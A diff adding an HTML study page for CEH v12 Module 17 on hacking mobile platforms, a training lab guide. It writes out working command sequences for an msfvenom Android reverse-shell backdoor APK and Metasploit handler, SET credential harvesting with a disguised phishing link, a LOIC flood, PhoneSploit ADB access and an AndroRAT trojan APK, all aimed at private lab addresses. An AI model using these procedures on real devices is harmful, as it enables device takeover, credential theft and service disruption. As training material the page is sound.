@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 17 - Hacking Mobile Platforms</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">&#9776;</button>
+    <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+            <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+            <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+            <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+            <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+            <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+            <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+            <li><a href="module_13.html" id="nav-13">MOD_13_WEBSRV</a></li>
+            <li><a href="module_14.html" id="nav-14">MOD_14_WEBAPP</a></li>
+            <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
+            <li><a href="module_16.html" id="nav-16">MOD_16_WIRELESS</a></li>
+            <li><a href="module_17.html" id="nav-17">MOD_17_MOBILE</a></li>
+            <li><a href="module_18.html" id="nav-18">MOD_18_IOT</a></li>
+        <li><a href="module_19.html" id="nav-19">MOD_19_CLOUD</a></li>
+        <li><a href="module_20.html" id="nav-20">MOD_20_CRYPTO</a></li>
+        <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        </ul>
+        <button id="viewToggle" class="view-toggle">COMPACT</button>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+    </nav>
+    <main class="content-body">
+        <div class="window">
+            <div class="module-header">
+                <span>CEH v12 - Module 17</span>
+                <h2 class="hero-3d">Hacking Mobile Platforms</h2>
+            </div>
+
+            <p>With the advancement of mobile technology, mobility has become a key feature of Internet usage. People's lifestyles are becoming increasingly reliant on smartphones and tablets. Mobile devices are replacing desktops and laptops, as they enable users to access email, the Internet, and GPS navigation, and to store critical data such as contact lists, passwords, calendars, and login credentials. In addition, recent developments in mobile commerce have enabled users to perform transactions on their smartphones such as purchasing goods and applications over wireless networks, redeeming coupons and tickets, and banking.</p>
+
+            <p>Most mobile devices come with options to send and receive text or email messages, as well as download applications via the Internet. Although these functions are technological advances, hackers continue to use them for malicious purposes. For example, they may send malformed APKs (application package files) or URLs to individuals to entice victims to click on or even install them, and so grant the attackers access to users' login credentials, or whole or partial control of their devices.</p>
+
+            <p>Mobile security is becoming more challenging with the emergence of complex attacks that utilize multiple attack vectors to compromise mobile devices. These security threats can lead to critical data, money, and other information being stolen from mobile users and may also damage the reputation of mobile networks and organizations. The belief that surfing the Internet on mobile devices is safe causes many users to not enable their devices' security software. The popularity of smartphones and their moderately lax security have made them attractive and more valuable targets to attackers.</p>
+
+            <p><strong>Scenario:</strong> As an expert ethical hacker or penetration tester, you should first test the mobile platform used by your organization for various vulnerabilities; then, using this information, you should secure it from possible attacks. In this lab, you will obtain hands-on experience with various techniques of launching attacks on mobile platforms, which will help you to audit their security.</p>
+
+            <p><strong>Objective:</strong> The objective of the lab is to carry out mobile platform hacking and other tasks that include, but are not limited to: exploit the vulnerabilities in an Android device; obtain users' credentials; hack an Android device with a malicious application; use an Android device to launch a DoS attack on a target; exploit an Android device through ADB; perform a security assessment on an Android device.</p>
+
+            <p><strong>Overview of Hacking Mobile Platforms:</strong> At present, smartphones are widely used for both business and personal purposes. Thus, they are a treasure trove for attackers looking to steal corporate or personal data. Security threats to mobile devices have increased with the growth of Internet connectivity, use of business and other applications, various methods of communication available, etc. Apart from certain security threats that are specific to them, mobile devices are also susceptible to many other threats that are applicable to desktop and laptop computers, web applications, and networks. Nowadays, smartphones offer broad Internet and network connectivity via varying channels such as 3G/4G/5G, Bluetooth, Wi-Fi, or wired computer connections. Security threats may arise while transmitting data at different points along these various paths.</p>
+
+            <p><strong>Lab Tasks:</strong></p>
+            <ul>
+                <li>Hack Android devices
+                    <ul>
+                        <li>Hack an Android device by creating binary payloads using Parrot Security</li>
+                        <li>Harvest users' credentials using the Social-Engineer Toolkit</li>
+                        <li>Launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform</li>
+                        <li>Exploit the Android platform through ADB using PhoneSploit</li>
+                        <li>Hack an Android device by creating an APK file using AndroRAT</li>
+                    </ul>
+                </li>
+                <li>Secure Android Devices using Various Android Security Tools
+                    <ul>
+                        <li>Analyze a malicious app using online Android analyzers</li>
+                        <li>Secure Android devices from malicious apps using Malwarebytes Security</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <section class="lab-task">
+                <h3>Exam Essentials: Hacking Mobile Platforms</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Scenario and Objective</span>
+                    <p><strong>Scenario:</strong> With the advancement of mobile technology, mobility is a key feature of Internet usage. Mobile devices store critical data (contacts, passwords, calendars, credentials) and support mobile commerce. Attackers send malformed APKs or URLs to entice victims to install them, gaining credentials or control. Mobile security is challenging due to complex multi-vector attacks; many users do not enable security software. As an ethical hacker/pen tester, you must first test the mobile platform used by your organization for vulnerabilities, then secure it from possible attacks.</p>
+                    <p><strong>Objective:</strong> Carry out mobile platform hacking: exploit vulnerabilities in an Android device; obtain users' credentials; hack an Android device with a malicious application; use an Android device to launch a DoS attack on a target; exploit an Android device through ADB; perform a security assessment on an Android device.</p>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Overview of Hacking Mobile Platforms and Android</span>
+                    <p>Smartphones are widely used for business/personal purposes and are a treasure trove for attackers. Threats grow with Internet connectivity, apps, and communication methods. Mobile devices are susceptible to desktop/laptop/web/network threats too. Connectivity via 3G/4G/5G, Bluetooth, Wi-Fi, or wired connections creates attack points along the data path. Android is a Google software environment (OS, middleware, key apps) based on Linux, designed for smartphones/tablets. Its stack: System Apps, Java API Framework, Native C/C++ Libraries, Android Runtime/ART, HAL, Linux kernel (six sections, five layers). Android's openness and large user base make it a prime target. Attacks include DoS, Man-in-the-Disk, and Spear phone attacks. BYOD policies increase exposure. iOS is Apple's mobile OS; jailbreaking is the iOS equivalent of rooting.</p>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Key Concepts</span>
+                    <ul>
+                        <li><strong>Mobile platform:</strong> OS/environment for smartphones/tablets (Android, iOS); stores sensitive data and supports commerce.</li>
+                        <li><strong>Android:</strong> Google's Linux-based mobile OS with a layered stack (System Apps, Java API Framework, Native libs, Android Runtime/ART, HAL, Linux kernel).</li>
+                        <li><strong>iOS:</strong> Apple's mobile OS; jailbreaking bypasses restrictions to gain root access.</li>
+                        <li><strong>APK (Android Package Kit):</strong> Application package file format for Android apps; malformed APKs/URLs are used to entice victims.</li>
+                        <li><strong>ADB (Android Debug Bridge):</strong> Command-line tool to communicate with a device; USB or wireless via daemon on TCP port 5555.</li>
+                        <li><strong>Backdoor APK:</strong> Malicious payload (e.g., android/meterpreter/reverse_tcp) that grants remote control (Meterpreter shell).</li>
+                        <li><strong>msfvenom:</strong> Metasploit payload generator; creates binary payloads/APKs for Android.</li>
+                        <li><strong>Metasploit Framework:</strong> Ruby-based modular pen-testing platform; multi/handler receives reverse shells; Meterpreter interactive shell.</li>
+                        <li><strong>Meterpreter:</strong> Metasploit payload providing an interactive shell to explore/execute code on target.</li>
+                        <li><strong>Reverse TCP:</strong> Payload that connects back to attacker's LHOST/LPORT (default 4444).</li>
+                        <li><strong>SET (Social-Engineer Toolkit):</strong> Python-driven social engineering toolkit; credential harvester clones sites.</li>
+                        <li><strong>Credential Harvester:</strong> SET attack that clones a website and captures submitted usernames/passwords in plain text.</li>
+                        <li><strong>LOIC (Low Orbit Ion Cannon):</strong> Open-source network stress/DoS tool flooding target with TCP/UDP packets.</li>
+                        <li><strong>PhoneSploit:</strong> Tool to exploit ADB-enabled Android devices: shell access, screenshots, app list/launch, MAC/Inet, netstat, file download.</li>
+                        <li><strong>AndroRAT:</strong> Remote administration tool for Android; persistent backdoor starting on boot; collects location, SIM, IP, MAC; interpreter shell.</li>
+                        <li><strong>Mobile malware:</strong> Trojans, ransomware, adware, spyware targeting mobile devices.</li>
+                        <li><strong>Mobile security:</strong> Patching, app vetting, permissions, antivirus, MDM, avoiding unknown sources.</li>
+                        <li><strong>MDM (Mobile Device Management):</strong> Centralized management/enforcement of security policies on mobile devices.</li>
+                        <li><strong>Rooting:</strong> Gaining privileged (root) access on Android.</li>
+                        <li><strong>Jailbreaking:</strong> Bypassing iOS restrictions to gain root access.</li>
+                        <li><strong>BYOD (Bring Your Own Device):</strong> Employees using personal devices for work; increases attack surface.</li>
+                        <li><strong>Man-in-the-Disk:</strong> Android attack exploiting insecure external storage to tamper with app data.</li>
+                        <li><strong>Spear phone attack:</strong> Targeted mobile attack.</li>
+                        <li><strong>Online APK analyzers:</strong> Sixo (sisik.eu), SandDroid, Apktool (javadecompilers.com) for decompiling/inspecting APKs.</li>
+                        <li><strong>AndroidManifest.xml:</strong> Declares package name, version, components, requested permissions; serialized binary XML inside APK.</li>
+                        <li><strong>Requested permissions:</strong> App capabilities requested at install/runtime; key indicator of malicious behavior.</li>
+                        <li><strong>Malwarebytes Security:</strong> Antimalware for Android: blocks/detects/removes adware/malware, privacy audits, safer browsing.</li>
+                        <li><strong>Other Android hacking tools:</strong> NetCut, drozer, zANTI, Network Spoofer, DroidSheep.</li>
+                        <li><strong>Other Android vuln scanners:</strong> X-Ray 2.0, Vulners Scanner, Shellshock Scanner (Zimperium), Yaazhini, QARK.</li>
+                        <li><strong>Other mobile AV/anti-spyware:</strong> AntiSpy Mobile, Spyware Detector, iAmNotified, Privacy Scanner.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Tools</span>
+                    <p><span class="tool-tag">msfvenom</span> <span class="tool-tag">Metasploit Framework</span> <span class="tool-tag">Meterpreter</span> <span class="tool-tag">ADB</span> <span class="tool-tag">PhoneSploit</span> <span class="tool-tag">AndroRAT</span> <span class="tool-tag">Social-Engineer Toolkit (SET)</span> <span class="tool-tag">LOIC</span> <span class="tool-tag">Parrot Security</span> <span class="tool-tag">Apache2</span> <span class="tool-tag">PostgreSQL</span> <span class="tool-tag">Wireshark</span> <span class="tool-tag">Chrome</span> <span class="tool-tag">Cx File Explorer</span> <span class="tool-tag">Malwarebytes Security</span> <span class="tool-tag">Sixo Online APK Analyzer</span> <span class="tool-tag">apktool</span> <span class="tool-tag">SandDroid</span> <span class="tool-tag">Android Studio</span> <span class="tool-tag">Windows Server 2019</span> <span class="tool-tag">Android Emulator</span></p>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Key Protocols / Ports</span>
+                    <ul>
+                        <li><strong>ADB wireless daemon:</strong> TCP 5555 on the device.</li>
+                        <li><strong>Metasploit reverse shell (default):</strong> TCP 4444 (LPORT).</li>
+                        <li><strong>HTTP (Apache/web delivery):</strong> TCP 80.</li>
+                        <li><strong>HTTPS:</strong> TCP 443.</li>
+                        <li><strong>PostgreSQL (Metasploit DB):</strong> TCP 5432.</li>
+                        <li><strong>Mobile networks:</strong> 3G/4G/5G cellular, Wi-Fi (802.11), Bluetooth.</li>
+                        <li><strong>Wi-Fi:</strong> 802.11 a/b/g/n/ac/ax (2.4/5/6 GHz); channels 1,6,11.</li>
+                        <li><strong>DoS target in lab:</strong> TCP 80 on 10.10.1.19.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Key Commands</span>
+                    <pre><code># Parrot Security: gain root
+sudo su
+# password: toor
+
+# Start DB + generate Android backdoor APK (LHOST = attacker IP)
+service postgresql start
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R &gt; Desktop/Backdoor.apk
+
+# Share via Apache
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+cp /root/Desktop/Backdoor.apk /var/www/html/share/
+
+# Metasploit handler
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+show options
+exploit -j -z
+# in session:
+sessions -i 1
+sysinfo
+ipconfig
+pwd
+cd /sdcard
+pwd
+ps
+
+# SET credential harvester
+cd social-engineer-toolkit
+./setoolkit
+# menu: 1 (Social-Engineering Attacks) - 2 (Website Attack Vectors) - 3 (Credential Harvester) - 2 (Site Cloner)
+# IP: 10.10.1.13 ; URL: http://certifiedhacker.com/Online%20Booking/index.htm
+
+# PhoneSploit
+cd PhoneSploit
+python3 -m pip install colorama
+python3 phonesploit.py
+# menu: 3 connect phone (IP 10.10.1.14); 4 shell; 7 screenshot; 14 list apps; 15 run app; 18 Mac/Inet; 21 netstat
+
+# AndroRAT
+cd AndroRAT
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
+service apache2 start
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+# interpreter: help, deviceInfo, getSMS inbox, getMACAddress, exit
+
+# Android online analyzer
+# Chrome: https://www.sisik.eu/apk-tool  (upload Backdoor.apk)
+
+# Malwarebytes
+# Android: open Malwarebytes -&gt; Get started -&gt; allow permissions -&gt; Skip subscription -&gt; SCAN NOW -&gt; Remove selected</code></pre>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Defenses</span>
+                    <ul>
+                        <li>Keep Android/iOS and apps patched; enable automatic updates.</li>
+                        <li>Install apps only from trusted stores; disable "Install unknown apps" / sideloading.</li>
+                        <li>Review app permissions; revoke unnecessary access to storage, SMS, accessibility, device admin.</li>
+                        <li>Use reputable mobile AV/anti-spyware (Malwarebytes, etc.) and run on-demand scans.</li>
+                        <li>Deploy MDM/EMM to enforce encryption, passcodes, remote wipe, and compliance.</li>
+                        <li>Disable ADB over network (TCP 5555); never leave developer options/USB debugging enabled in production.</li>
+                        <li>Disable unnecessary connectivity (Bluetooth, Wi-Fi) when not in use; avoid untrusted networks.</li>
+                        <li>Use strong device passcodes/biometrics; enable full-disk encryption.</li>
+                        <li>Educate users on phishing, malicious APKs, and suspicious links/emails.</li>
+                        <li>Monitor for rogue apps, abnormal battery/data usage, and unknown device admins.</li>
+                        <li>Segment BYOD devices; restrict access to corporate resources via VPN/ZTNA.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <span class="tool-tag">Exam Tips</span>
+                    <ul>
+                        <li>ADB wireless daemon listens on TCP port 5555; Shodan can find ADB-enabled devices.</li>
+                        <li>msfvenom Android payload: android/meterpreter/reverse_tcp; platform android; arch dalvik; LHOST attacker IP; output via R &gt; file.apk.</li>
+                        <li>Metasploit handler: use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST; exploit -j -z.</li>
+                        <li>SET credential harvester: 1 -&gt; 2 -&gt; 3 -&gt; 2 (Site Cloner); IP for POST back; URL to clone; captures creds in plain text.</li>
+                        <li>LOIC floods target with TCP/UDP packets; lab target 10.10.1.19 port 80, 100 threads.</li>
+                        <li>PhoneSploit menu: 3 connect, 4 shell, 7 screenshot, 14 list apps, 15 run app, 18 Mac/Inet, 21 netstat; p for next page.</li>
+                        <li>AndroRAT builds APK with --build -i IP -p 4444 -o file.apk; listens with --shell -i 0.0.0.0 -p 4444; interpreter commands help, deviceInfo, getSMS inbox, getMACAddress.</li>
+                        <li>Parrot root password: toor; attacker account password: toor.</li>
+                        <li>Android emulator victim IP in lab: 10.10.1.14; attacker/Parrot IP: 10.10.1.13; Windows Server 2019 target: 10.10.1.19.</li>
+                        <li>Online analyzer Sixo: https://www.sisik.eu/apk-tool; inspect requested permissions and AndroidManifest.xml.</li>
+                        <li>Malwarebytes: scan, remove threats, view scan history.</li>
+                        <li>Other Android hacking tools: NetCut, drozer, zANTI, Network Spoofer, DroidSheep.</li>
+                        <li>Other vuln scanners: X-Ray 2.0, Vulners Scanner, Shellshock Scanner (Zimperium), Yaazhini, QARK.</li>
+                    </ul>
+                </div>
+                <div class="section-card">
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Always obtain proper authorization; use these techniques only in authorized labs/environments.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Hack Android Devices - Overview</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Lab Scenario, Objectives, and Overview</span>
+                    <p><strong>Lab Scenario:</strong> The number of people using smartphones and tablets is on the rise, as these devices support a wide range of functionalities. Android is the most popular mobile OS, because it is a platform open to all applications. Like other OSes, Android has its vulnerabilities, and not all Android users install patches to keep OS software and apps up to date and secure. This casualness enables attackers to exploit vulnerabilities and launch various types of attacks to steal valuable data stored on the victims' devices. Owing to the extensive usage and implementation of bring your own device (BYOD) policies in organizations, mobile devices have become a prime target for attacks. Attackers scan these devices for vulnerabilities. These attacks can involve the device and the network layer, the data center, or a combination of these. As a professional ethical hacker or pen tester, you should be familiar with all the hacking tools, exploits, and payloads to perform various tests on mobile devices connected to a network to assess its security infrastructure.</p>
+                    <p><strong>Lab Objectives:</strong> Hack an Android device by creating binary payloads using Parrot Security; harvest users' credentials using the Social-Engineer Toolkit; launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform; exploit the Android platform through ADB using PhoneSploit; hack an Android device by creating an APK file using AndroRAT.</p>
+                    <p><strong>Overview of Hacking Android Platforms:</strong> Android is a software environment developed by Google for mobile devices. It includes an OS, a middleware, and key applications. Its Linux-based OS is designed especially for portable devices such as smartphones and tablets. Android has a stack of software components categorized into six sections (System Apps, Java AP Framework, Native C/C++ Libraries, Android Runtime, Hardware Abstraction Layer [HAL], and Linux kernel) and five layers. Owing to the increase in the number of users with Android devices, they have become the primary targets for hackers. Attackers use various Android hacking tools to discover vulnerabilities in the platform, and then exploit them to carry out attacks such as DoS, Man-in-the-Disk, and Spear phone attacks.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Hack Android Devices - Task 1: Hack an Android Device by Creating Binary Payloads using Parrot Security</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit Framework / msfvenom / Meterpreter / Parrot Security / Apache2 / PostgreSQL / Android Emulator</span>
+                    <p><strong>What/when:</strong> Create an Android backdoor APK with msfvenom (android/meterpreter/reverse_tcp), host it via Apache on Parrot Security, and catch the reverse shell with a Metasploit multi/handler. The victim (Android emulator) downloads and installs the APK, granting a Meterpreter session. Used to audit Android device security. Attacker IP 10.10.1.13; victim IP 10.10.1.14.</p>
+                    <pre><code># Parrot Security machine
+# login: attacker / toor  (if updater/update prompts appear, ignore/close or click No)
+
+# Open terminal
+# click MATE Terminal icon at top of Desktop
+sudo su
+# [sudo] password for attacker: toor (not visible)
+# root prompt
+
+# Start PostgreSQL (Metasploit DB)
+service postgresql start
+
+# Generate backdoor APK (LHOST = attacker IP 10.10.1.13)
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R &gt; Desktop/Backdoor.apk
+# creates Backdoor.apk on Desktop under /root
+
+# Create shared web folder and permissions
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+
+# Start Apache web server
+service apache2 start
+
+# Copy APK to web share
+cp /root/Desktop/Backdoor.apk /var/www/html/share/
+
+# Launch Metasploit
+msfconsole
+
+# In msfconsole:
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+show options
+# listening port defaults to 4444
+exploit -j -z
+# runs exploit as background job
+
+# Victim: Android emulator
+# if non-responsive: Commands -&gt; Power -&gt; Reset/Reboot machine (Yes)
+# open Chrome, address bar: http://10.10.1.13/share  (Allow storage if prompted)
+# click Backdoor.apk to download
+# Open -&gt; SETTINGS -&gt; Allow from this source -&gt; back -&gt; Install -&gt; OPEN
+# (Play Protect: INSTALL ANYWAY; scanning: DON'T SEND)
+
+# Attacker: session opened from 10.10.1.14
+sessions -i 1
+# 1 = session number
+sysinfo
+ipconfig
+pwd
+cd /sdcard
+pwd
+# /storage/emulated/0
+ps
+
+# Cleanup on victim
+# Home screen -&gt; swipe up -&gt; apps -&gt; long-press MainActivity -&gt; App info -&gt; UNINSTALL (OK)</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Parrot Security and log in attacker/toor. Open MATE Terminal, sudo su, toor. Start PostgreSQL. Run msfvenom to generate Backdoor.apk on Desktop (LHOST=10.10.1.13). Create /var/www/html/share, set permissions, start Apache, copy APK. Launch msfconsole; use exploit/multi/handler; set payload and LHOST; show options (port 4444); exploit -j -z. Switch to Android; if non-responsive reboot. Open Chrome, browse http://10.10.1.13/share, download and install Backdoor.apk (enable unknown sources), open app. Switch back to Parrot; meterpreter session from 10.10.1.14 opens. Run sessions -i 1, sysinfo, ipconfig, pwd, cd /sdcard, pwd, ps. Uninstall MainActivity from Android. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> In real life attackers deliver payloads via email attachments, Bluetooth, or other means. Poor security settings and lack of awareness allow backdoor installation, leading to data theft, spying, and malware upload. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Hack Android Devices - Task 2: Harvest Users' Credentials using the Social-Engineer Toolkit</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Social-Engineer Toolkit (SET) / Site Cloner / Credential Harvester / Parrot Security / Android Emulator / Firefox / Gmail</span>
+                    <p><strong>What/when:</strong> Use SET's Credential Harvester (Site Cloner) to clone a login page (certifiedhacker.com booking), host it on Parrot Security, and lure the victim via a phishing email with a disguised link. When the victim submits credentials, SET displays them in plain text in the terminal. Used to demonstrate credential harvesting on mobile. Attacker IP 10.10.1.13.</p>
+                    <pre><code># Parrot Security machine
+# Open terminal (MATE Terminal icon)
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Navigate to SET and launch
+cd social-engineer-toolkit
+./setoolkit
+
+# SET menu selections:
+# 1  - Social-Engineering Attacks
+# 2  - Website Attack Vectors
+# 3  - Credential Harvester Attack Method
+# 2  - Site Cloner
+
+# When prompted "IP address for the POST back in Harvester/Tabnabbing":
+# type 10.10.1.13  (Parrot Security IP) and press Enter
+# When prompted "Enter the url to clone":
+# type http://certifiedhacker.com/Online%20Booking/index.htm and press Enter
+# (If "Press {return} if you understand..." appears, press Enter)
+# (If "Do you want to attempt to disable Apache?" appears, type y and press Enter)
+
+# Phishing email via Firefox/Gmail
+# Click Firefox icon; log in to email account; click Compose
+# Compose enticing email; position cursor for link; click Insert link icon
+# Edit Link: Web address = http://10.10.1.13 ; Text to display = http://www.bookhotel.com/change_account_password ; OK
+# Verify link points to cloned site (Gmail shows "Go to link"); send email
+
+# Victim: Android emulator
+# open Chrome; sign in to email account; open phishing email; click malicious link
+# cloned certifiedhacker page opens; scroll to end; enter Username and Password; click Login
+# page shows an error
+
+# Attacker: Parrot Security terminal
+# scroll down to find Username and Password displayed in plain text
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Parrot Security; open MATE Terminal; sudo su; toor. cd social-engineer-toolkit; ./setoolkit. Select 1, 2, 3, 2. Enter IP 10.10.1.13 and clone URL http://certifiedhacker.com/Online%20Booking/index.htm (press Enter/y as prompted). Launch Firefox, log in email, compose phishing email with disguised link (actual http://10.10.1.13, display http://www.bookhotel.com/change_account_password), send. Switch to Android; open Chrome; sign in email; click link; cloned site opens; enter username/password; Login shows error. Switch to Parrot; scroll terminal to view harvested Username and Password in plain text. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> SET attacks human weakness and trust. Any URL can be cloned. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Hack Android Devices - Task 3: Launch a DoS Attack on a Target Machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform</h3>
+                <div class="section-card">
+                    <span class="tool-tag">LOIC (Low Orbit Ion Cannon) / Cx File Explorer / Wireshark / Android Emulator / Windows Server 2019</span>
+                    <p><strong>What/when:</strong> Install LOIC on Android via Cx File Explorer (from network share 10.10.1.11), target Windows Server 2019 (10.10.1.19) on TCP port 80 with 100 threads, and observe the flood in Wireshark on Windows Server 2019. Demonstrates mobile-based DoS. Attacker Android IP 10.10.1.14.</p>
+                    <pre><code># Android machine
+# if non-responsive: Commands -&gt; Power -&gt; Reset/Reboot machine (Yes)
+# after reboot: Home screen -&gt; swipe right to left to second page
+# click Cx File Explorer app
+# Cx File Explorer: click 10.10.1.11 (Network) -&gt; CEH-Tools -&gt; CEHv12 Module 17 Hacking Mobile Platforms -&gt; Android Hacking Tools -&gt; Low Orbit Ion Cannon (LOIC)
+# click Low Orbit Ion Cannon LOIC_v1.3.apk
+# "Do you want to install this application?" -&gt; INSTALL
+# on completion "App installed" -&gt; OPEN
+
+# LOIC app
+# set target: left pane URL field type 10.10.1.19 ; click GET IP
+# IP displayed under Manual IP
+# select TCP radio button; right pane Port = 80 ; Threads = 100 ; click Start
+# LOIC floods target with TCP packets
+
+# Windows Server 2019 machine
+# login: Admin / Pa$$w0rd ; Networks: Yes
+# search wire -&gt; open Wireshark
+# double-click primary interface (Ethernet) to start capture
+# observe huge number of packets from 10.10.1.14 (Android) to 10.10.1.19 (target)
+# click Stop capturing packets icon
+# observe huge packet count in Packets field; performance degradation
+
+# Stop attack
+# Android: LOIC -&gt; click STOP</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Android; reboot if needed; navigate to second Home page; open Cx File Explorer; browse network share 10.10.1.11 to LOIC_v1.3.apk; install and open. In LOIC set target URL 10.10.1.19, GET IP, select TCP, port 80, threads 100, Start. Switch to Windows Server 2019; log in Admin/Pa$$w0rd; open Wireshark; capture on Ethernet; observe flood from 10.10.1.14 to 10.10.1.19; stop capture; note packet count and performance degradation. Switch to Android and click STOP. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> LOIC is an open-source network stress/DoS tool; flooding with TCP/UDP packets disrupts service. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Hack Android Devices - Task 4: Exploit the Android Platform through ADB using PhoneSploit</h3>
+                <div class="section-card">
+                    <span class="tool-tag">ADB (Android Debug Bridge) / PhoneSploit / Parrot Security / Android Emulator</span>
+                    <p><strong>What/when:</strong> Exploit an ADB-enabled Android device (TCP 5555) with PhoneSploit: connect, open a remote shell, enumerate files, capture a screenshot, list/launch apps, and gather MAC/Inet and netstat info. Demonstrates post-exploitation via ADB. Target Android IP 10.10.1.14; attacker Parrot IP 10.10.1.13.</p>
+                    <pre><code># Parrot Security machine
+# if Android non-responsive: reboot via Commands -&gt; Power -&gt; Reset/Reboot (Yes)
+# Open terminal (MATE Terminal icon)
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Navigate to PhoneSploit and install dependency
+cd PhoneSploit
+python3 -m pip install colorama
+# dependency may already be present
+
+# Run PhoneSploit
+python3 phonesploit.py
+
+# Main menu:
+# 3 - Connect a new phone
+# when prompted "Enter a phones ip address": 10.10.1.14
+# device connects via port 5555 (retry 3 if connection timed out)
+
+# 4 - Access Shell on a phone
+# "Enter a device name": 10.10.1.14
+# shell prompt appears
+pwd
+ls
+cd sdcard
+ls
+cd Download
+ls
+# note location of images.jpeg (/sdcard/Download/images.jpeg)
+exit
+# returns to main menu
+
+# 7 - Screen Shot a picture on a phone
+# "Enter a device name": 10.10.1.14
+# "Enter where you would like the screenshot to be saved": /home/attacker/Desktop
+# screenshot saved as screen.png
+# Places -&gt; Desktop to view screen.png
+
+# 14 - List all apps on a phone
+# "Enter a device name": 10.10.1.14
+# displays installed apps
+
+# 15 - Run an app
+# "Enter a device name": 10.10.1.14
+# app package: com.android.calculator2
+# calculator launches on target; random values entered
+
+# p - navigate to additional options (Next Page)
+# 18 - Show Mac/Inet information
+# "Enter a device name": 10.10.1.14
+# displays Mac/Inet info
+
+# 21 - NetStat
+# "Enter a device name": 10.10.1.14
+# displays netstat info
+
+# Other options: Install an apk, Screen record, Turn device off, Uninstall an app</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Parrot Security; reboot Android if needed. Open MATE Terminal; sudo su; toor. cd PhoneSploit; install colorama; run phonesploit.py. Select 3 and connect to 10.10.1.14 via ADB port 5555 (retry if needed). Select 4 for shell; run pwd, ls, cd sdcard, ls, cd Download, ls; note images.jpeg path; exit. Select 7 to screenshot; save to /home/attacker/Desktop; view screen.png. Select 14 to list apps; select 15 to run com.android.calculator2 (verify on Android). Press p for next page; select 18 (Mac/Inet) and 21 (netstat). Note Shodan is used in real life to find ADB-enabled devices. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> ADB usually connects via USB but can run wirelessly on TCP 5555. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Hack Android Devices - Task 5: Hack an Android Device by Creating APK File using AndroRAT</h3>
+                <div class="section-card">
